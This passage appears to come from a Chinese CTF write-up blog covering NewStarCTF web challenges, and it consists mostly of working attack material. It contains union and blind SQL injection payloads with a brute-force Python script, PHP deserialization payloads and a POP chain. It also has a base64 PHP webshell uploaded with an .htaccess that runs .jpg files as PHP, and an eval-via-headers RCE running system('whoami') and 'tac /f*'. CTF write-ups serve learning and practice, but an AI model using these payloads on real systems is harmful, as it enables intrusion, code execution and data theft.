class="line">ISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)</span><br><span class="line">JIS</span><br><span class="line">JIS-ms</span><br><span class="line">CP50220</span><br><span class="line">CP50220raw</span><br><span class="line">CP50221</span><br><span class="line">CP50222</span><br><span class="line">ISO-8859-1*</span><br><span class="line">ISO-8859-2*</span><br><span class="line">ISO-8859-3*</span><br><span class="line">ISO-8859-4*</span><br><span class="line">ISO-8859-5*</span><br><span class="line">ISO-8859-6*</span><br><span class="line">ISO-8859-7*</span><br><span class="line">ISO-8859-8*</span><br><span class="line">ISO-8859-9*</span><br><span class="line">ISO-8859-10*</span><br><span class="line">ISO-8859-13*</span><br><span class="line">ISO-8859-14*</span><br><span class="line">ISO-8859-15*</span><br><span class="line">ISO-8859-16*</span><br><span class="line">byte2be</span><br><span class="line">byte2le</span><br><span class="line">byte4be</span><br><span class="line">byte4le</span><br><span class="line">BASE64</span><br><span class="line">HTML-ENTITIES (alias: HTML)</span><br><span class="line">7bit</span><br><span class="line">8bit</span><br><span class="line">EUC-CN*</span><br><span class="line">CP936</span><br><span class="line">GB18030</span><br><span class="line">HZ</span><br><span class="line">EUC-TW*</span><br><span class="line">CP950</span><br><span class="line">BIG-5*</span><br><span class="line">EUC-KR*</span><br><span class="line">UHC (alias: CP949)</span><br><span class="line">ISO-2022-KR</span><br><span class="line">Windows-1251 (alias: CP1251)</span><br><span class="line">Windows-1252 (alias: CP1252)</span><br><span class="line">CP866 (alias: IBM866)</span><br><span class="line">KOI8-R*</span><br><span class="line">KOI8-U*</span><br><span class="line">ArmSCII-8 (alias: ArmSCII8)</span><br></pre></td></tr></table></figure>

<p>Èó®ÈÅìÂæàÊ∑±ÔºåÂèØ‰ª•ÁúãÁúãÈôÜÈòüÁöÑÊñáÁ´†</p>
<p><a target="_blank" rel="noopener" href="https://zedd-yu-github-io.vercel.app/p/hxp-ctf-2021-the-end-of-lfi/">https://zedd-yu-github-io.vercel.app/p/hxp-ctf-2021-the-end-of-lfi/</a></p>
<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>ÁÆÄÂçïËøáÊª§ËÅîÂêàÊ≥®ÂÖ•Âç≥ÂèØ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union sElect 1,2,3,4,5--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">sElect</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">sElect</span> group_concat(table_name)<span class="keyword">from</span> mysql.innodb_table_stats),<span class="number">5</span><span class="comment">--+</span></span><br><span class="line"># grades,here_is_flag,gtid_slave_pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;union sElect 1,2,3,(sElect group_concat(`1`) from (sElect * from here_is_flag)a),5--+</span></span><br><span class="line"><span class="string"># Ê≤°Êä•ÈîôËØ¥ÊòéÊ≤°ÂÜôÈîôÔºåÂÜçÊääflagÂ∏¶Âá∫Êù•Â∞±Ë°å</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">sElect</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">sElect</span> group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">Select</span> <span class="number">3</span> <span class="keyword">union</span> <span class="keyword">sElect</span> <span class="operator">*</span> <span class="keyword">from</span> here_is_flag)a),<span class="number">5</span><span class="comment">--+</span></span><br><span class="line"># <span class="number">1</span>,flag&#123;bc8317fc<span class="operator">-</span>c0b2<span class="number">-489e-879</span>d<span class="number">-111</span>a988aa848&#125;</span><br></pre></td></tr></table></figure>

<h2 id="UnserializeÔºü"><a href="#UnserializeÔºü" class="headerlink" title="UnserializeÔºü"></a>UnserializeÔºü</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="variable">$cmd1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a=new evil(&#x27;ls /&#x27;);</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>(<span class="string">&#x27;head /th1s_1s_fffflllll4444aaaggggg &#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p>‰∏ä‰º†<code>.htaccess</code>Â∞±Â•Ω‰∫Ü</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypelbI2sZUZHuXDs8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>315</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarypelbI2sZUZHuXDs8</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;poc.jpg&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarypelbI2sZUZHuXDs8</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Upload!!!</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarypelbI2sZUZHuXDs8--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./poc.jpg&quot;</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<h2 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>gitÊÅ¢Â§ç‰πãÂêéÊãøÂà∞Ê∫êÁ†Å</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Êú¨Âú∞ÊµãËØïÂèØ‰ª•RCEÔºå</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/1.php?star=eval(next(getallheaders()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-fetch-user</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>system(&quot;whoami&quot;);</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‰ΩÜÊòØËøúÁ®ãÂ∞±ÂæàÂ•áÊÄ™‰∫ÜÔºåÂ§ö‰∫ÜÂæàÂ§öÊú¨Ë∫´ÊäìÂåÖÈÉΩÊ≤°ÊúâÁöÑhttpÂ§¥</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/bo0g1pop.php?star=eval(next(getallheaders()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>6e7da965-f969-4ad3-81bd-4be5caba6585.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">X-Request-ID</span><span class="punctuation">: </span>system(&quot;tac /f*&quot;);</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-fetch-user</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>system(&quot;whoami&quot;);</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‰ΩÜÊòØËøô‰∫õËØ∑Ê±ÇÂ§¥ÂèàÈÉΩÊòØÂèØÊéßÁöÑÔºåÊâÄ‰ª•ËµãÂÄºÂ∞±ÂèØ‰ª•R</p>
<h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>ËøôÈÅìÈ¢òÊúâÁÇπÁ¶ªË∞±ÁöÑÊòØ<code>information</code>ÂøÖÈ°ªÂÜôÊàê<code>infOrmation</code>‰∏çÁÑ∂Â∞±‰∏çÊàêÂäü„ÄÇÂæàÂ•áÊÄ™</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f91b90bf-0fac-4211-8ae0-f1c9ca753a60.node5.buuoj.cn:81/?id=&quot;</span></span><br><span class="line">maxlen = <span class="number">50</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, maxlen+<span class="number">1</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>), desc=<span class="string">f&quot;ÁàÜÁ†¥Á¨¨<span class="subst">&#123;i&#125;</span>‰Ωç&quot;</span>, ncols=<span class="number">70</span>):</span><br><span class="line">        <span class="comment"># payload = f&quot;TMP0929&#x27;AnD If(Ascii(Mid((database()),&#123;i&#125;,1))=&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment"># ctf</span></span><br><span class="line">        <span class="comment"># payload = f&quot;TMP0929&#x27;AnD If(Ascii(Mid((Select(Group_concat(table_name))From(infOrmation_schema.tables)wHere(Table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))=&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment"># here_is_flag,grades</span></span><br><span class="line">        <span class="comment"># payload = f&quot;TMP0929&#x27;AnD If(Ascii(Mid((Select(Group_concat(column_name))From(infOrmation_schema.columns)wHere(Table_name=&#x27;here_is_flag&#x27;)),&#123;i&#125;,1))=&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment"># flag</span></span><br><span class="line">        payload = <span class="string">f&quot;TMP0929&#x27;AnD If(Ascii(Mid((Select(flag)From(ctf.here_is_flag)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;TMP0929&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += <span class="built_in">chr</span>(mid)</span><br><span class="line">            tqdm.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>‰Ωç: <span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span> ÂΩìÂâç: <span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ÁªìÊûú:&quot;</span>, target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>‰ªñËøôphpÁâàÊú¨ÂÖ∂ÂÆûÊòØ‰øÆÈ•∞Á¨¶‰∏çÊïèÊÑüÁöÑ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></pre></td></tr></table></figure>

